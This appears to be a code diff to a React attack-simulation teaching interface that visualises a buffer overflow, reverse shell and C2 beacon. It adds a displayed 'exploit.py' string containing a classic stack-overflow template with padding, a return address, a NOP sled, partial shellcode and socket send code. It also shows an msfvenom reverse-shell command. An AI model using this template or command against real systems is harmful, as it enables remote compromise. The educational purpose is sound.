@@ -16,7 +16,63 @@ const RELAY_IP = "172.20.44.9";
 const DISPLAY_OVERFLOW_COMMAND =
   'msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.20.44.9 LPORT=443 -b "\\x00\\x0a\\x0d" -f python';
 
-const OVERFLOW_COMMAND = DISPLAY_OVERFLOW_COMMAND.toLowerCase();
+const normalizeCommand = (value: string) =>
+  value.trim().toLowerCase().replace(/\s+/g, " ");
+
+const OVERFLOW_COMMAND = normalizeCommand(DISPLAY_OVERFLOW_COMMAND);
+
+const EXPLOIT_SCRIPT_NAME = "exploit.py";
+
+const EXPLOIT_SCRIPT_CONTENT = `import time
+
+# educational script
+# No real socket connection
+# No real payload is sent
+
+# 1. Target Configuration
+ip = "203.0.113.25"      # Target IP
+port = 8080              # parser/input gateway port
+
+# 2. The Payload (Generated from msfvenom)
+# Example: msfvenom -p windows/shell_reverse_tcp LHOST=... -f python
+shellcode = (
+    b"\\xbb\\x61\\xd4\\x13\\x11\\xdb\\xcc\\xd9\\x74\\x24\\xf4\\x5a\\x33\\xc9\\xb1"
+    b"\\x52\\x31\\x5a\\x12\\x83\\xc2\\x04\\x03\\x3d\\x23\\x52\\x15\\x4c\\x0c\\x11"
+    # ... rest of your msfvenom output ...
+)
+
+# 3. Crafting the String
+# 'offset' is the exact number of bytes needed to reach the Return Address (EIP/RIP)
+offset = 1024 
+padding = b"A" * offset           # Fills the buffer
+eip = b"\\xaf\\x11\\x50\\x62"         # Memory address to JMP to the shellcode
+nop_sled = b"\\x90" * 32           # Landing zone for the CPU
+
+# The final package
+payload = padding + eip + nop_sled + shellcode
+
+# 4. Simulated Delivery
+# 4. The Delivery (The "Send")
+try:
+    print(f"[*] Sending exploit to {ip}:{port}...")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))         # Establish connection
+    s.send(payload)               # Inject payload into memory
+    s.close()
+    print("[+] Exploit sent! Check your listener.")
+except Exception as e:
+    print(f"[!] Could not connect: {e}")
+    sys.exit()
+
+print(f"[*] Preparing demo package for {ip}:{port}...")
+time.sleep(1)
+print(f"[*] Demo package size: {len(payload)} bytes")
+time.sleep(1)
+print("[*] Simulating packet delivery through the UI...")
+time.sleep(1)
+print("[+] Demo payload dispatched (simulation only)")
+print("[+] Check the buffer visualization and stack snapshot.")
+`;
 
 const targetProfile: TargetProfile = {
   hostname: "demo-target.local",
@@ -78,7 +134,7 @@ export default function SplitLayout() {
 
   const [targetInput, setTargetInput] = useState("");
   const [targetResponse, setTargetResponse] = useState(
-    "Awaiting package delivery."
+    "Awaiting mock package delivery."
   );
   const [serverLog, setServerLog] = useState<string[]>(makeInitialServerLog());
   const [lastObservedSource, setLastObservedSource] = useState("none");
@@ -98,6 +154,14 @@ export default function SplitLayout() {
     ]);
   }
 
+  function appendScriptToTerminal(scriptText: string) {
+    const lines = scriptText.split("\n");
+    setTerminalLines((prev) => [
+      ...prev,
+      ...lines.map((line) => makeLine("info", line === "" ? " " : line)),
+    ]);
+  }
+
   function resetTerminal() {
     setTerminalLines(makeInitialTerminalLines());
   }
@@ -106,7 +170,7 @@ export default function SplitLayout() {
     appendLines(
       {
         tone: "info",
-        text: `Starting scan against ${targetProfile.hostname}`,
+        text: `Starting mock scan against ${targetProfile.hostname}`,
       },
       {
         tone: "info",
@@ -164,11 +228,11 @@ export default function SplitLayout() {
     appendLines(
       {
         tone: "warning",
-        text: `[build] staged payload (${overflowRequestPreview.length} bytes on wire, ${overflowBufferWrite.length} bytes copied into input buffer)`,
+        text: `[build] staged oversized demo package (${overflowRequestPreview.length} bytes on wire, ${overflowBufferWrite.length} bytes copied into input buffer)`,
       },
       {
         tone: "warning",
-        text: "[build] copied input is intended to trigger overflow",
+        text: "[build] copied input is intended to trigger overflow visualization only",
       }
     );
   }
@@ -181,10 +245,10 @@ export default function SplitLayout() {
     setTransferDirection("outbound");
     setPacketVisible(true);
     setPacketStage("target");
-    setTargetResponse("Callback in progress...");
+    setTargetResponse("Simulated callback in progress...");
     appendLines({
       tone: "info",
-      text: `[callback] check-in initiated from ${targetProfile.hostname}`,
+      text: `[callback] mock check-in initiated from ${targetProfile.hostname}`,
     });
 
     if (routeMode === "relay") {
@@ -204,7 +268,7 @@ export default function SplitLayout() {
       setBeaconCount((prev) => prev + 1);
       appendLines({
         tone: "success",
-        text: `[c2] beacon received from ${targetProfile.hostname}`,
+        text: `[c2] simulated beacon received from ${targetProfile.hostname}`,
       });
     }, c2Delay);
 
@@ -216,7 +280,7 @@ export default function SplitLayout() {
       setPacketVisible(false);
       setPacketStage("idle");
       setTransferDirection("inbound");
-      setTargetResponse("Compromise active. Callback loop armed.");
+      setTargetResponse("Simulated compromise active. Callback loop armed.");
       beaconBusyRef.current = false;
     }, c2Delay + 1700);
   }
@@ -235,7 +299,7 @@ export default function SplitLayout() {
     if (!payloadName || !payloadPreview || !payloadWriteBuffer) {
       appendLines({
         tone: "warning",
-        text: `[send] no payload staged — use "build package safe" or "${DISPLAY_OVERFLOW_COMMAND}"`,
+        text: `[send] no package staged — use "build package safe" or "${DISPLAY_OVERFLOW_COMMAND}"`,
       });
       return;
     }
@@ -287,7 +351,7 @@ export default function SplitLayout() {
       if (payloadName === "safe") {
         setTargetCompromised(false);
         setBeaconEnabled(false);
-        setTargetResponse("200 OK — request parsed within reserved region.");
+        setTargetResponse("200 OK — mock request parsed within reserved region.");
         setServerLog([
           `request observed from ${simulatedSource}`,
           `request bytes on wire: ${payloadPreview.length}`,
@@ -308,13 +372,13 @@ export default function SplitLayout() {
       } else {
         setTargetCompromised(true);
         setBeaconEnabled(true);
-        setTargetResponse("Compromise active. Callback loop armed.");
+        setTargetResponse("Simulated compromise active. Callback loop armed.");
         setServerLog([
           `request observed from ${simulatedSource}`,
           `request bytes on wire: ${payloadPreview.length}`,
           `input bytes copied into buffer: ${payloadWriteBuffer.length}`,
           "reserved region exceeded in simulation view",
-          "compromise state entered",
+          "mock compromise state entered",
         ]);
         appendLines(
           {
@@ -323,11 +387,11 @@ export default function SplitLayout() {
           },
           {
             tone: "warning",
-            text: "[target] compromise state entered",
+            text: "[target] mock compromise state entered",
           },
           {
             tone: "info",
-            text: "[callback] periodic check-in enabled",
+            text: "[callback] simulated periodic check-in enabled",
           }
         );
       }
@@ -349,9 +413,36 @@ export default function SplitLayout() {
     }, targetDelay + 900);
   }
 
+  function runExploitDemoScript() {
+    buildPackage("overflow-demo");
+
+    appendLines(
+      {
+        tone: "info",
+        text: `[*] Preparing demo payload for ${targetProfile.hostname} (${targetProfile.ip}:8080)`,
+      },
+      {
+        tone: "info",
+        text: "[*] Payload staged from local script context",
+      },
+      {
+        tone: "info",
+        text: "[*] Simulating python script execution...",
+      }
+    );
+
+    window.setTimeout(() => {
+      appendLines({
+        tone: "success",
+        text: "[+] Demo script finished staging payload",
+      });
+      sendPackage();
+    }, 800);
+  }
+
   function handleCommand(rawCommand: string) {
     const command = rawCommand.trim();
-    const lower = command.toLowerCase();
+    const lower = normalizeCommand(command);
 
     if (!command) return;
 
@@ -371,10 +462,12 @@ export default function SplitLayout() {
         { tone: "info", text: "show beacon" },
         { tone: "info", text: "route use relay" },
         { tone: "info", text: "route use direct" },
-        { tone: "info", text: "nmap demo-target.local" },
-        { tone: "info", text: "nmap -sV demo-target.local" },
+        { tone: "info", text: "nmap 203.0.113.25" },
+        { tone: "info", text: "nmap -sV 203.0.113.25" },
         { tone: "info", text: "build package safe" },
         { tone: "info", text: DISPLAY_OVERFLOW_COMMAND },
+        { tone: "info", text: `cat ${EXPLOIT_SCRIPT_NAME}` },
+        { tone: "info", text: `python3 ${EXPLOIT_SCRIPT_NAME}` },
         { tone: "info", text: "send package" },
         { tone: "info", text: "beacon start" },
         { tone: "info", text: "beacon stop" },
@@ -427,18 +520,18 @@ export default function SplitLayout() {
     if (lower === "route use direct") {
       setRouteMode("direct");
       appendLines({
-        tone: "success",
-        text: `Route updated to direct mode from ${C2_IP}`,
+        tone: "error",
+        text: `WARNING Route updated to direct mode from ${C2_IP}`,
       });
       return;
     }
 
-    if (lower === "nmap demo-target.local") {
+    if (lower === "nmap 203.0.113.25") {
       runMockScan(false);
       return;
     }
 
-    if (lower === "nmap -sv demo-target.local") {
+    if (lower === "nmap -sv 203.0.113.25") {
       runMockScan(true);
       return;
     }
@@ -450,6 +543,16 @@ export default function SplitLayout() {
 
     if (lower === OVERFLOW_COMMAND) {
       buildPackage("overflow-demo");
+      return;
+    }
+
+    if (lower === `cat ${EXPLOIT_SCRIPT_NAME}`) {
+      appendScriptToTerminal(EXPLOIT_SCRIPT_CONTENT);
+      return;
+    }
+
+    if (lower === `python3 ${EXPLOIT_SCRIPT_NAME}`) {
+      runExploitDemoScript();
       return;
     }
 
